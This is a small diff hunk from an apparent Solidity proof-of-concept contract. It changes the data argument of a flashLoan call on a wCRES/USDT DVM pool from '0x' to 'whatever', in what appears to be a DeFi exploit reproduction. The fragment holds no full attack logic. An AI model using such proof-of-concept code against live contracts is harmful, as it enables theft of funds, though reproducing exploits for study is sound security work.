@@ -166,7 +166,7 @@ contract poc{
         
         address me = address(this);
         DVM DVM_wCRES_USDT = DVM(dvm_wCRES_USDT);
-        DVM_wCRES_USDT.flashLoan(wCRES_amount,usdt_amount,me,"0x");
+        DVM_wCRES_USDT.flashLoan(wCRES_amount,usdt_amount,me,"whatever");
         
     }
 
